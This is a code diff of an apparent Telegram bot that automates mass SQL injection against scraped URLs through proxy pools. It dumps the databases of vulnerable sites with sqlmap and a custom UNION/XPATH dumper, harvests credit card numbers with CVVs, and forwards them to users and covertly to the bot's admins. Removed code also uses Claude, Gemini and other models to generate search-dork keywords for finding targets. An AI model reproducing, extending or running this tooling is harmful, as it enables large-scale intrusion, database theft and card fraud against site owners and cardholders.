-                f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ    : `{vuln_n:,}` | 💀 Dᴇᴀᴅ: `{dead_n:,}`\n\n"
-                f"`[{bar}]` {pct}%\n\n"
-                "_12-Core Anti-Stuck V6 SQLi Verification..._",
-                reply_markup=stop_kb,
-                parse_mode=ParseMode.MARKDOWN,
-            )
-        except Exception:
-            pass
+    vuln_urls    = []
+    tested_count = [0]
+    sem_sqli     = asyncio.Semaphore(200)
+    _proxy_list  = effective_proxy_pool(uid)
 
-    _p2_stats    = await run_mass_sqli_12core(found_urls, user_id=uid, progress_cb=_pipe_prog_cb, stop_event=stop_event)
-    vuln_pairs   = _p2_stats["vuln"]
-    vuln_urls    = [u for u, _ in vuln_pairs]
-    tested_count = [_p2_stats["tested"]]
+    connector = _get_connector()
+    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
+        async def _sqli_test(url: str):
+            if stop_event.is_set():
+                return
+            async with sem_sqli:
+                proxy_url = random.choice(_proxy_list) if _proxy_list else ""
+                if await _check_injectable(session, url, proxy_url=proxy_url):
+                    vuln_urls.append(url)
+                tested_count[0] += 1
+                now = time.monotonic()
+                if now - last_edit[0] >= 1.5:
+                    last_edit[0] = now
+                    pct    = int(tested_count[0] / len(found_urls) * 100)
+                    filled = int(pct / 5)
+                    bar    = "█" * filled + "░" * (20 - filled)
+                    try:
+                        await msg.edit_text(
+                            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
+                            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                            f"📈 URLs Tᴇsᴛᴇᴅ : `{tested_count[0]:,}/{len(found_urls):,}`\n"
+                            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ  : `{len(vuln_urls):,}`\n\n"
+                            f"`[{bar}]` {pct}%\n\n"
+                            "_Injecting SQL payloads..._",
+                            reply_markup=stop_kb,
+                            parse_mode=ParseMode.MARKDOWN,
+                        )
+                    except Exception:
+                        pass
 
-    if not vuln_urls:
+        # Process in batches of 600
+        SQLI_BATCH = 600
+        for i in range(0, len(found_urls), SQLI_BATCH):
+            if stop_event.is_set():
+                break
+            batch = found_urls[i: i + SQLI_BATCH]
+            await asyncio.gather(*[_sqli_test(u) for u in batch], return_exceptions=True)
+
+    if stop_event.is_set() or not vuln_urls:
         reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_event.is_set() else "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs"
         await msg.edit_text(
             f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
-            f"📈 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ : `{tested_count[0]:,}` (From `{len(found_urls):,}` URLs)\n"
-            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ    : `0`",
+            f"📈 URLs Tᴇsᴛᴇᴅ : `{tested_count[0]:,}`\n"
+            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ  : `{len(vuln_urls):,}`\n\n"
+            "_Nᴏ Iɴᴊᴇᴄᴛᴀʙʟᴇs Fᴏᴜɴᴅ Iɴ Tʜɪs Bᴀᴛᴄʜ._",
             parse_mode=ParseMode.MARKDOWN,
         )
-        stop_events.pop(uid, None)
         await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
         return MENU
 
-    # IMMEDIATELY deliver confirmed Vulnerable URLs `.txt` BEFORE Phase 3 DB Dump even starts!
-    try:
-        await update.message.reply_document(
-            document=io.BytesIO("\n".join(vuln_urls).encode("utf-8")),
-            filename=f"sqli_vulnerable_{len(vuln_urls)}_{ts}.txt",
-            caption=(
-                f"🎭 Phase 2 Complete — `{len(vuln_urls):,}` Confirmed Vulnerable URLs!\n"
-                f"🔥 Now Starting Turbo Phase 3 Database + CC Extraction..."
-            ),
-            parse_mode=ParseMode.MARKDOWN,
-            read_timeout=180.0,
-            write_timeout=180.0,
-        )
-        await update.message.reply_document(
-            document=io.BytesIO("\n".join(f"{u}  # [{det}]" for u, det in vuln_pairs).encode("utf-8")),
-            filename=f"sqli_detailed_vectors_{len(vuln_urls)}_{ts}.txt",
-            caption=f"📋 Verified SQLi Vector Breakdown (`{len(vuln_urls):,}` Targets)",
-            parse_mode=ParseMode.MARKDOWN,
-            read_timeout=180.0,
-            write_timeout=180.0,
-        )
-    except Exception:
-        pass
-
-    if stop_event.is_set():
-        stop_events.pop(uid, None)
-        await update.message.reply_text("🛑 Pipeline Stopped — Vulnerable URLs Saved Above ⬆️", reply_markup=make_main_menu())
-        return MENU
-
-    # ── PHASE 3: HYBRID TURBO ASYNC UNION/XPATH DUMPER + FAST DIRECT SQLMAP ──
-    # IMPORTANT: NEVER pass dead `global_proxy_pool` free proxies into DB dumpers!
-    clean_custom_proxies = list(user_proxies.get(uid, []))
-    all_cards    = []
-    dump_results = []
-    dumped_urls_set = set()
-
-    # Stage 3A: Instant 100-Concurrent Pure-Python UNION + XPATH Extraction (`14s` max/site — NEVER hangs!)
-    try:
-        await msg.edit_text(
-            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3A/3 (Turbo Async Dump)*\n"
-            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ URLs : `{len(vuln_urls):,}`\n"
-            "⚡ Sᴛᴀɢᴇ 3A : `100-Concurrent UNION/XPATH Instant DB Dump`...\n\n"
-            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
-            reply_markup=stop_kb,
-            parse_mode=ParseMode.MARKDOWN,
-        )
-    except Exception:
-        pass
-
-    async def _on_turbo_dump_prog(d_done, d_tot, d_ok):
-        now = time.monotonic()
-        if now - last_edit[0] < 1.4:
-            return
-        last_edit[0] = now
-        pct = int((d_done / d_tot) * 100) if d_tot else 0
-        filled = int(pct / 5)
-        bar = "█" * filled + "░" * (20 - filled)
-        try:
-            await msg.edit_text(
-                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3A/3 (Turbo Async Dump)*\n"
-                "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{d_tot:,}` sites\n"
-                f"⚡ Pʀᴏᴄᴇssᴇᴅ  : `{d_done:,}/{d_tot:,}`\n"
-                f"🕳️ DBs Dᴜᴍᴘᴇᴅ : `{d_ok:,}`\n\n"
-                f"`[{bar}]` {pct}%",
-                reply_markup=stop_kb,
-                parse_mode=ParseMode.MARKDOWN,
-            )
-        except Exception:
-            pass
-
-    fast_dumps = await dump_multiple(
-        vuln_urls,
-        stop_event=stop_event,
-        progress_cb=_on_turbo_dump_prog,
-        max_concurrent=80,
-        proxy_list=clean_custom_proxies,
-    )
-    if fast_dumps:
-        txt_blocks = []
-        for dr in fast_dumps:
-            dumped_urls_set.add(dr.url)
-            dump_results.append(dr)
-            if dr.cards:
-                all_cards.extend(dr.cards)
-            hdr = f"{'='*64}\nURL: {dr.url}\nDB : {dr.db_name} | Tables: {', '.join(dr.tables[:15])}\n{'='*64}"
-            body_lines = []
-            for tname, rows in dr.dumped.items():
-                body_lines.append(f"\n--- TABLE: {tname} ({len(rows)} rows) ---")
-                body_lines.extend(rows[:200])
-            txt_blocks.append(hdr + "\n" + "\n".join(body_lines))
-        full_dump_bytes = "\n\n".join(txt_blocks).encode("utf-8", errors="ignore")
-        if len(full_dump_bytes) <= 44 * 1024 * 1024:
-            try:
-                await update.message.reply_document(
-                    document=io.BytesIO(full_dump_bytes),
-                    filename=f"turbo_db_dumps_{len(fast_dumps)}_{ts}.txt",
-                    caption=(
-                        f"🕳️ *Stage 3A Turbo DB Dump Complete!*\n"
-                        f"✅ `{len(fast_dumps):,}` Databases Extracted Instantly\n"
-                        f"💳 CC Hits Found So Far: `{len(all_cards):,}`"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN,
-                    read_timeout=180.0,
-                    write_timeout=180.0,
-                )
-            except Exception:
-                pass
-
-    # Stage 3B: Run fast `50s`-capped parallel SQLMap ONLY on remaining un-dumped targets!
-    remaining_for_sqlmap = [u for u in vuln_urls if u not in dumped_urls_set]
+    # ── PHASE 3: SQLMAP DATABASE DUMP (REST API + fallback subprocess) ───────
     o        = _get_sqlopts(uid)
     eng      = o["engine"]
+    use_bulk = o["bulk"]
     lvl      = o["level"]
     rsk      = o["risk"]
     tech     = o["technique"]
     tamp     = o["tamper"]
-    threads  = max(o["threads"], 8)
+    threads  = o["threads"]
     crawl    = o["crawl"]
-    eng_tag  = "Turbo Async + REST API" if eng == "api" else "Turbo Async + SQLMap"
-    last_log = [""]
+    eng_tag  = "REST API" if eng == "api" else "Subprocess"
 
-    if remaining_for_sqlmap and not stop_event.is_set():
-        if eng == "api" and await ensure_api_server():
-            async def on_dump_progress_api(done, total_, success):
-                now = time.monotonic()
-                if now - last_edit[0] < 1.8:
-                    return
-                last_edit[0] = now
-                pct    = int((done / total_) * 100) if total_ else 0
-                filled = int(pct / 5)
-                bar    = "█" * filled + "░" * (20 - filled)
-                log_snippet = last_log[0][:120].replace("`", "'") if last_log[0] else "_sqlmap deep pass..._"
+    try:
+        await msg.edit_text(
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3*\n"
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ URLs : `{len(vuln_urls):,}`\n"
+            f"🎠 Eɴɢɪɴᴇ         : *{eng_tag}*\n"
+            f"♨️ Lᴇᴠᴇʟ/Rɪsᴋ      : `L{lvl}R{rsk}`\n"
+            f"🧤 Tᴇᴄʜɴɪǫᴜᴇ       : `{tech}`\n"
+            f"🛡️ Tᴀᴍᴘᴇʀ         : `{tamp[:40]}`\n"
+            f"⚜️ Bᴜʟᴋ Mᴏᴅᴇ       : `{'ON' if use_bulk else 'OFF'}`\n\n"
+            "🕳️ Dᴜᴍᴘɪɴɢ Dᴀᴛᴀʙᴀsᴇs — ZIPs Wɪʟʟ Bᴇ Sᴇɴᴛ Sᴏᴏɴ Aᴄᴄᴏʀᴅɪɴɢ Sɪᴛᴇ...\n\n"
+            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
+            reply_markup=stop_kb,
+            parse_mode=ParseMode.MARKDOWN,
+        )
+    except Exception:
+        pass
+
+    all_cards    = []
+    ts           = datetime.now().strftime("%d%m%y_%H%M")
+    last_log     = [""]
+    dump_results = []
+
+    if eng == "api":
+        # ── REST API MODE ──────────────────────────────────────────────────────
+        async def on_dump_progress_api(done, total_, success):
+            now = time.monotonic()
+            if now - last_edit[0] < 2.0:
+                return
+            last_edit[0] = now
+            pct    = int((done / total_) * 100) if total_ else 0
+            filled = int(pct / 5)
+            bar    = "█" * filled + "░" * (20 - filled)
+            log_snippet = last_log[0][:120].replace("`", "'") if last_log[0] else "_sqlmap running..._"
+            try:
+                await msg.edit_text(
+                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (REST API)*\n"
+                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
+                    f"🐊 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
+                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
+                    f"💳 Cᴄ Hɪᴛs  : `{len(all_cards):,}`\n\n"
+                    f"`[{bar}]` {pct}%\n\n"
+                    f"📡 `{log_snippet}`",
+                    reply_markup=stop_kb,
+                    parse_mode=ParseMode.MARKDOWN,
+                )
+            except Exception:
+                pass
+
+        async def on_each_result_api(r: ApiTaskResult, zip_bytes: bytes):
+            if r.cards:
+                all_cards.extend(r.cards)
+            dump_results.append(r)
+            if zip_bytes:
+                domain = (r.url.split("/")[2][:40] if "/" in r.url else r.url[:40]) if r.url else "unknown"
+                banner_txt = f"\n🐊 `{r.banner[:60]}`" if r.banner else ""
+                db_txt     = f"\n🔰 `{r.current_db[:40]}`" if r.current_db else ""
                 try:
-                    await msg.edit_text(
-                        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                        f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3B/3 (Deep SQLMap)*\n"
-                        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                        f"🎭 Rᴇᴍᴀɪɴɪɴɢ  : `{done:,}/{total_:,}` sites\n"
-                        f"🕳️ Tᴏᴛᴀʟ Dᴜᴍᴘs : `{len(dump_results) + success:,}`\n"
-                        f"💳 CC Hɪᴛs    : `{len(all_cards):,}`\n\n"
-                        f"`[{bar}]` {pct}%\n\n"
-                        f"📡 `{log_snippet}`",
-                        reply_markup=stop_kb,
+                    await update.message.reply_document(
+                        document=io.BytesIO(zip_bytes),
+                        filename=f"sqlmap_{domain}_{ts}.zip",
+                        caption=(
+                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
+                            f"📈 `{r.url[:80]}`"
+                            f"{banner_txt}{db_txt}\n"
+                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
+                        ),
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
                     pass
 
-            async def on_each_result_api(r: ApiTaskResult, zip_bytes: bytes):
-                if r.cards:
-                    all_cards.extend(r.cards)
-                dump_results.append(r)
-                if zip_bytes:
-                    domain = (r.url.split("/")[2][:40] if "/" in r.url else r.url[:40]) if r.url else "unknown"
-                    try:
-                        await update.message.reply_document(
-                            document=io.BytesIO(zip_bytes),
-                            filename=f"sqlmap_{domain}_{ts}.zip",
-                            caption=(
-                                f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
-                                f"📈 `{r.url[:80]}`\n"
-                                f"💳 CC Hɪᴛs: `{len(r.cards)}`"
-                            ),
-                            parse_mode=ParseMode.MARKDOWN,
-                            read_timeout=180.0,
-                            write_timeout=180.0,
-                        )
-                    except Exception:
-                        pass
+        def on_log_line(url: str, line: str):
+            last_log[0] = line
 
+        if use_bulk:
+            # One sqlmap task for all URLs (--bulk-file)
+            bulk_result = await api_bulk_dump(
+                vuln_urls,
+                proxy_list   = effective_proxy_pool(uid),
+                level        = lvl,
+                risk         = rsk,
+                technique    = tech,
+                threads      = threads,
+                tamper       = tamp,
+                stop_event   = stop_event,
+                log_cb       = lambda line: None,
+            )
+            if bulk_result.success:
+                dump_results.append(bulk_result)
+                all_cards.extend(bulk_result.cards)
+        else:
             await api_dump_multiple(
-                remaining_for_sqlmap,
-                proxy_list     = clean_custom_proxies,
+                vuln_urls,
+                proxy_list     = effective_proxy_pool(uid),
                 level          = lvl,
                 risk           = rsk,
                 technique      = tech,
                 threads        = threads,
                 tamper         = tamp,
                 crawl_depth    = crawl,
-                task_timeout   = 50,
                 stop_event     = stop_event,
                 progress_cb    = on_dump_progress_api,
                 per_result_cb  = on_each_result_api,
-                log_sample_cb  = lambda u, line: last_log.__setitem__(0, line),
+                log_sample_cb  = on_log_line,
             )
-        else:
-            sqlmap_base = tempfile.mkdtemp(prefix="loop_sqlmap_")
 
-            async def on_dump_progress_sub(done, total_, success):
-                now = time.monotonic()
-                if now - last_edit[0] < 1.8:
-                    return
-                last_edit[0] = now
-                pct    = int((done / total_) * 100) if total_ else 0
-                filled = int(pct / 5)
-                bar    = "█" * filled + "░" * (20 - filled)
+    else:
+        # ── SUBPROCESS FALLBACK MODE ──────────────────────────────────────────
+        sqlmap_base = tempfile.mkdtemp(prefix="loop_sqlmap_")
+
+        async def on_dump_progress_sub(done, total_, success):
+            now = time.monotonic()
+            if now - last_edit[0] < 2.0:
+                return
+            last_edit[0] = now
+            pct    = int((done / total_) * 100) if total_ else 0
+            filled = int(pct / 5)
+            bar    = "█" * filled + "░" * (20 - filled)
+            try:
+                await msg.edit_text(
+                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (𝙎𝙪𝙗𝙥𝙧𝙤𝙘𝙚𝙨𝙨)*\n"
+                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
+                    f"🧤 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
+                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
+                    f"💳 CC Hɪᴛs  : `{len(all_cards):,}`\n\n"
+                    f"`[{bar}]` {pct}%\n\n"
+                    "_sqlmap subprocess running..._",
+                    reply_markup=stop_kb,
+                    parse_mode=ParseMode.MARKDOWN,
+                )
+            except Exception:
+                pass
+
+        async def on_each_result_sub(r: SqlmapResult, zip_bytes: bytes):
+            if r.cards:
+                all_cards.extend(r.cards)
+            dump_results.append(r)
+            if zip_bytes:
+                domain = r.url.split("/")[2][:40] if r.url else "unknown"
                 try:
-                    await msg.edit_text(
-                        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                        f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3B/3 (Deep SQLMap)*\n"
-                        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                        f"🎭 Rᴇᴍᴀɪɴɪɴɢ  : `{done:,}/{total_:,}` sites\n"
-                        f"🕳️ Tᴏᴛᴀʟ Dᴜᴍᴘs : `{len(dump_results) + success:,}`\n"
-                        f"💳 CC Hɪᴛs    : `{len(all_cards):,}`\n\n"
-                        f"`[{bar}]` {pct}%",
-                        reply_markup=stop_kb,
+                    await update.message.reply_document(
+                        document=io.BytesIO(zip_bytes),
+                        filename=f"sqlmap_{domain}_{ts}.zip",
+                        caption=(
+                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
+                            f"📈 `{r.url[:80]}`\n"
+                            f"🔖 CSV Fɪʟᴇs: `{r.csv_files}`\n"
+                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
+                        ),
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
                     pass
 
-            async def on_each_result_sub(r: SqlmapResult, zip_bytes: bytes):
-                if r.cards:
-                    all_cards.extend(r.cards)
-                dump_results.append(r)
-                if zip_bytes:
-                    domain = r.url.split("/")[2][:40] if r.url else "unknown"
-                    try:
-                        await update.message.reply_document(
-                            document=io.BytesIO(zip_bytes),
-                            filename=f"sqlmap_{domain}_{ts}.zip",
-                            caption=(
-                                f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
-                                f"📈 `{r.url[:80]}`\n"
-                                f"💳 CC Hɪᴛs: `{len(r.cards)}`"
-                            ),
-                            parse_mode=ParseMode.MARKDOWN,
-                            read_timeout=180.0,
-                            write_timeout=180.0,
-                        )
-                    except Exception:
-                        pass
-
-            await sqlmap_dump_multiple(
-                remaining_for_sqlmap,
-                base_dir      = sqlmap_base,
-                proxy_list    = clean_custom_proxies,
-                stop_event    = stop_event,
-                progress_cb   = on_dump_progress_sub,
-                per_result_cb = on_each_result_sub,
-            )
+        await sqlmap_dump_multiple(
+            vuln_urls,
+            base_dir     = sqlmap_base,
+            proxy_list   = effective_proxy_pool(uid),
+            stop_event   = stop_event,
+            progress_cb  = on_dump_progress_sub,
+            per_result_cb= on_each_result_sub,
+        )
+        try:
             shutil.rmtree(sqlmap_base, ignore_errors=True)
+        except Exception:
+            pass
 
-    stop_events.pop(uid, None)
     all_cards = list(dict.fromkeys(all_cards))
-    stopped   = stop_event.is_set()
-    status    = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
-    emoji     = "🛑" if stopped else "✅"
+
+    stopped = stop_event.is_set()
+    status  = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
+    emoji   = "🛑" if stopped else "✅"
 
     await msg.edit_text(
         "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
@@ -9272,9 +7995,9 @@ async def _run_dump_pipeline(
         f"📈 URLs Fᴏᴜɴᴅ       : `{len(found_urls):,}`\n"
         f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ       : `{len(vuln_urls):,}`\n"
         f"🕳️ Sɪᴛᴇs Dᴜᴍᴘᴇᴅ     : `{len(dump_results):,}`\n"
-        f"💳 CC Hɪᴛs          : `{len(all_cards):,}`\n"
+        f"💳 CC Hɪᴛs : `{len(all_cards):,}`\n"
         f"🔧 Eɴɢɪɴᴇ           : *{eng_tag}*\n\n"
-        f"{emoji} 100% Complete — Zero Hang! Files above ⬆️",
+        f"{emoji} Pipeline done. Files above ⬆️",
         parse_mode=ParseMode.MARKDOWN,
     )
 
@@ -9287,20 +8010,24 @@ async def _run_dump_pipeline(
             caption=(
                 f"💳 `{len(all_cards):,}` CC Hɪᴛs\n"
                 "Format: `number|MM|YY|cvv`\n"
-                "🕷️ Sᴘɪᴅᴇʏ 12-Cᴏʀᴇ V6 Pɪᴘᴇʟɪɴᴇ"
+                "🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ — Sǫʟ-Mᴀᴘ REST API Pɪᴘᴇʟɪɴᴇ"
             ),
             parse_mode=ParseMode.MARKDOWN,
-            read_timeout=180.0,
-            write_timeout=180.0,
         )
-        if uid not in ADMIN_IDS:
+        uid_ = update.effective_user.id
+        if uid_ not in ADMIN_IDS:
             for _aid in ADMIN_IDS:
                 try:
                     await context.bot.send_document(
                         chat_id=_aid,
                         document=io.BytesIO(cc_bytes),
                         filename=cc_fname,
-                        caption=f"💥 *Aʟᴇʀᴛ — Usᴇʀ* `{uid}`\n💳 `{len(all_cards):,}` CC Hɪᴛs found!",
+                        caption=(
+                            f"💥 *Aʟᴇʀᴛ — Usᴇʀ* `{uid_}`\n"
+                            f"💳 `{len(all_cards):,}` CC Hɪᴛs found!\n"
+                            "Fᴏʀᴍᴀᴛ: `CCN|MM|YY|cvv`\n"
+                            "⚡ Sǫʟ-Mᴀᴘ Rᴇsᴛ API Pɪᴘᴇʟɪɴᴇ"
+                        ),
                         parse_mode=ParseMode.MARKDOWN,
                     )
                 except Exception:
@@ -9394,7 +8121,7 @@ async def gdork_dump_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     result = await api_google_dork_dump(
         dork,
-        proxy_list   = list(user_proxies.get(uid, [])),
+        proxy_list   = effective_proxy_pool(uid),
         level        = lvl,
         risk         = rsk,
         technique    = o["technique"],
@@ -9557,44 +8284,6 @@ async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not has_access(user_id):
         await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
         return MENU
-
-    waiting_prov = context.user_data.get("waiting_for_ai_key")
-    if waiting_prov and is_admin(user_id) and update.message and update.message.text:
-        text = update.message.text.strip()
-        if text.lower() == "/cancel":
-            context.user_data.pop("waiting_for_ai_key", None)
-            await update.message.reply_text("❌ Cancelled AI key setup.", reply_markup=make_admin_menu())
-            return MENU
-
-        _save_ai_key(waiting_prov, text)
-        context.user_data.pop("waiting_for_ai_key", None)
-        _prov_name = {"anthropic": "Anthropic Claude", "gemini": "Google Gemini", "openrouter": "OpenRouter"}.get(waiting_prov, waiting_prov)
-        masked = text[:6] + "..." + text[-4:] if len(text) > 10 else "***"
-        await update.message.reply_text(
-            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            f"✅ *{_prov_name} Key Saved!*\n"
-            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
-            f"🔑 Key: `{masked}`\n"
-            f"💾 Saved to `ai_keys.json` & runtime active.\n\n"
-            f"🚀 `/aigen` is now ready to use with {_prov_name}!",
-            reply_markup=make_ai_keys_kb(),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return MENU
-
-    if context.user_data.pop("waiting_for_aigen_topic", False) and update.message and update.message.text:
-        topic = update.message.text.strip()
-        if topic and not topic.startswith("/"):
-            context.user_data["aigen_prompt"] = topic
-            await update.message.reply_text(
-                f"⚔️ *AI Keywords Generator*\n\n"
-                f"📝 Prompt: `{topic[:60]}`\n\n"
-                f"🤖 Select AI Provider:",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=_make_aigen_provider_kb(),
-            )
-            return MENU
-
     await update.message.reply_text("Use /start to open the main menu.", reply_markup=make_main_menu())
     return MENU
 
@@ -9936,487 +8625,6 @@ async def adork_gen_n_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
 
 
-# ── EXTENDED FEATURES (AI, Emails, LiveFeed, StatusCheck) ───────────────────────
-
-# ── /emails — harvest emails from any uploaded txt ──────────────────────
-def _clean_ai_keywords(raw_text: str) -> list:
-    """Strip <think> blocks, markdown fences, numbering & bullets into pure keywords."""
-    cleaned = re.sub(r"<think>.*?</think>", "", raw_text, flags=re.DOTALL | re.IGNORECASE)
-    out = []
-    for line in cleaned.splitlines():
-        s = line.strip()
-        if not s or s.startswith("```") or s.startswith("#"):
-            continue
-        s = re.sub(r"^(?:\d+[\.)\-:\s]+|[\-\*•]+\s+)", "", s).strip().strip("`\"'")
-        if s and len(s) <= 90 and not s.lower().startswith(("here are", "sure,", "certainly")):
-            out.append(s)
-    return list(dict.fromkeys(out))
-
-def _make_aigen_provider_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔵 Claude Sonnet (Anthropic)", callback_data="aigen_anthropic")],
-        [InlineKeyboardButton("🟢 Gemini 2.5 Flash (Google)", callback_data="aigen_gemini")],
-        [InlineKeyboardButton("🟡 GPT-4o / Mini (OpenRouter)", callback_data="aigen_gpt4o")],
-        [InlineKeyboardButton("🟠 Mistral (OpenRouter)", callback_data="aigen_mistral")],
-        [InlineKeyboardButton("🟣 LLaMA 3.3 — FREE (OpenRouter)", callback_data="aigen_llama")],
-        [InlineKeyboardButton("🔴 DeepSeek R1 / V3 — FREE", callback_data="aigen_deepseek")],
-        [InlineKeyboardButton("⬅️ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
-    ])
-
-# ── Core AI keyword generator (2026 Models + Automatic Multi-Model Fallback) ──
-async def _ai_generate_keywords(prompt: str, provider: str) -> tuple[list, str]:
-    """
-    Returns (keywords_list, error_string).
-    Automatically reloads ai_keys.json and tries primary + fallback 2026 models.
-    """
-    _load_ai_keys()
-    _sys = (
-        "You are an expert OSINT and search-dork keyword generator. "
-        "Output ONLY raw search keywords, strictly ONE keyword/phrase per line. "
-        "No numbering, no bullets, no introduction, no explanation. "
-        "Generate at least 600 diverse, high-converting niche keywords."
-    )
-    _user = f"Generate 600+ highly specific search keywords and parameter terms for: {prompt}"
-
-    # ── Anthropic (Claude 4.5 / 3.5 Fallback Chain) ──────────────────────
-    if provider == "anthropic":
-        if not _ANTHROPIC_KEY:
-            return [], "Anthropic key not set! Use /setkey anthropic YOUR_KEY"
-        last_err = "Empty response"
-        for _m in ("claude-sonnet-4-5", "claude-sonnet-4-20250514", "claude-3-5-sonnet-latest", "claude-3-haiku-20240307"):
-            try:
-                async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as s:
-                    async with s.post(
-                        "https://api.anthropic.com/v1/messages",
-                        headers={
-                            "x-api-key": _ANTHROPIC_KEY,
-                            "anthropic-version": "2023-06-01",
-                            "content-type": "application/json",
-                        },
-                        json={
-                            "model": _m,
-                            "max_tokens": 8000,
-                            "system": _sys,
-                            "messages": [{"role": "user", "content": _user}],
-                        },
-                        timeout=aiohttp.ClientTimeout(total=75),
-                    ) as r:
-                        d = await r.json(content_type=None)
-                if "error" in d:
-                    msg = d["error"].get("message", str(d["error"])) if isinstance(d["error"], dict) else str(d["error"])
-                    last_err = msg[:120]
-                    if "not_found" in msg.lower() or "model" in msg.lower():
-                        continue
-                    return [], last_err
-                text = "".join(c.get("text", "") for c in d.get("content", []) if isinstance(c, dict))
-                kws = _clean_ai_keywords(text)
-                if kws:
-                    return kws, ""
-            except Exception as e:
-                last_err = str(e)[:120]
-        return [], last_err
-
-    # ── Google Gemini (2026 Models: 2.5-flash -> 2.0-flash -> flash-latest) ─
-    elif provider == "gemini":
-        if not _GEMINI_KEY:
-            return [], "Gemini key not set! Use /setkey gemini YOUR_KEY"
-        last_err = "Empty response"
-        for _gm in ("gemini-2.5-flash", "gemini-2.0-flash", "gemini-flash-latest", "gemini-1.5-flash-latest"):
-            try:
-                _url = f"https://generativelanguage.googleapis.com/v1beta/models/{_gm}:generateContent?key={_GEMINI_KEY}"
-                async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as s:
-                    async with s.post(
-                        _url,
-                        json={
-                            "contents": [{"parts": [{"text": _sys + "\n\n" + _user}]}],
-                            "generationConfig": {"maxOutputTokens": 8192},
-                        },
-                        timeout=aiohttp.ClientTimeout(total=75),
-                    ) as r:
-                        d = await r.json(content_type=None)
-                if "error" in d:
-                    msg = d["error"].get("message", str(d["error"])) if isinstance(d["error"], dict) else str(d["error"])
-                    last_err = msg[:120]
-                    if r.status == 404 or "not found" in msg.lower() or "not supported" in msg.lower():
-                        continue
-                    return [], last_err
-                cands = d.get("candidates") or []
-                if cands:
-                    parts = cands[0].get("content", {}).get("parts", [])
